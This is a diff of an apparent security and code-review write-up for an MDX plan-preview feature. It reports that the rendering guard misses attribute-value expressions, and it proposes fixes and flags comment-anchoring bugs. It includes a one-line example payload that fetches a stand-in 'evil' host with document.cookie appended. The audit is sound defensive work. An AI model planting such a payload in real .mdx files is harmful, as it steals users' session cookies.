@@ -21,7 +21,7 @@ real modules (throwaway tests, removed afterwards) — not by inspection alone.
 - `vp check` → **0 errors**, 15 warnings, all pre-existing patterns elsewhere
   (`no-array-index-key`, `no-unstable-nested-components` in `ChatMarkdown`,
   mobile). **None in the mdx-plan code.**
-- `vp run typecheck` → **0 errors** (2 unrelated `effect(...)` *suggestions* in
+- `vp run typecheck` → **0 errors** (2 unrelated `effect(...)` _suggestions_ in
   `apps/desktop`).
 - Feature tests (`src/components/files/mdx-plan/`) → **17/17 pass**.
 
@@ -38,7 +38,7 @@ cannot catch.
 (`remarkRejectCodeEscapes`, `DISALLOWED_MDX_NODES`).
 
 The stated guarantee (D2 / spike Verdict 1) is that the remark guard + closed
-registry make *"the only executable surface the finite block set we author."*
+registry make _"the only executable surface the finite block set we author."_
 **This is false.** The guard walks only `node.children` and rejects
 `mdxjsEsm` / `mdxFlowExpression` / `mdxTextExpression`. MDX **attribute-value
 expressions** (`mdxJsxAttributeValueExpression`, e.g. `code={…}`) live in
@@ -55,22 +55,23 @@ wire format needs — runs at render time in the module (global) scope.
 
 So `code={fetch('https://evil/'+document.cookie)}` executes in the user's
 browser with full DOM / network / credential access. The existing test suite
-never probes this — `mdxPlan.test.ts` only rejects a *body* expression
-(`value: {globalThis.location}`), and its "good" fixture actually *relies* on an
+never probes this — `mdxPlan.test.ts` only rejects a _body_ expression
+(`value: {globalThis.location}`), and its "good" fixture actually _relies_ on an
 attribute expression (`code={"…"}`) rendering, which is the same door.
 
 Severity is Blocker, not merely theoretical, because the render path is reachable
 by **any `.mdx` file opened in the preview panel** — `isMdxPreviewFile` is
 `/\.mdx$/i` (`filePreviewMode.ts:4`), so a `.mdx` from a cloned repo, a PR, a
 dependency, or a prompt-injected agent turn is enough. Accepting `unsafe-eval`
-(D2 Option A) was justified *by* this guard bounding the eval surface; with the
+(D2 Option A) was justified _by_ this guard bounding the eval surface; with the
 guard porous, that rationale collapses.
 
 **Fix options (either closes it):**
+
 - Extend the guard to visit attribute-value expressions and reject any that are
   not static literals. The literal-only estree walker **already exists** in
-  `mdxAttrs.ts` (`literalNodeValue`) — it is currently used only on the *parse*
-  path (`fromAttrs`), not the *render* path. Reusing it in the remark plugin makes
+  `mdxAttrs.ts` (`literalNodeValue`) — it is currently used only on the _parse_
+  path (`fromAttrs`), not the _render_ path. Reusing it in the remark plugin makes
   the documented guarantee true while preserving the `entities={[…]}` JSON wire
   format.
 - Or adopt D2 Option B (server-side `compile()` + `blob:` module) — heavier, only
@@ -97,7 +98,7 @@ designed to fill missing ids, but it skips any element that `hasAttribute(
 "data-plan-block-id")` — which these always do. So every un-`id`'d block keeps
 `data-plan-block-id=""`.
 
-**Demonstrated** (probe): a whole-block anchor on the *second* un-id'd block
+**Demonstrated** (probe): a whole-block anchor on the _second_ un-id'd block
 serialises `targetSelector: [data-plan-block-id=""]`; `resolveAnchor` →
 `root.querySelector('[data-plan-block-id=""]')` returns the **first** match. Two+
 un-id'd blocks ⇒ every whole-block ("visual") comment attaches to the wrong
@@ -133,7 +134,7 @@ anchor degrades to "detached" instead of taking down the layer.
 
 `anchorFromRange` (`anchoring.ts:120-159`) never sets `anchor.ambiguous`, even
 when the quote occurs multiple times in the flattened text. The agent-facing
-detail block (`planCommentAnchor.ts:64-66`) *renders* an "Ambiguous: this quote
+detail block (`planCommentAnchor.ts:64-66`) _renders_ an "Ambiguous: this quote
 may match more than one place" line — but it is dead because the flag is never
 true. Duplicate-quote disambiguation happens at resolve time via context scoring
 (which works — tested), but the injected prompt never tells the model the anchor
@@ -153,7 +154,7 @@ worth a boundary-normalisation.
 
 The pre-flagged item (`anchoring.ts:26-34`). `<Endpoint>` has a genuine prose
 description (`childrenField: "description"`), so text-quote anchoring over its
-prose (path, summary, param notes) is the *desirable* behaviour, and whole-block
+prose (path, summary, param notes) is the _desirable_ behaviour, and whole-block
 anchoring is still available via the per-block affordance. **No change needed** —
 leave it prose. (Note: its whole-block path is still subject to S1.)
 
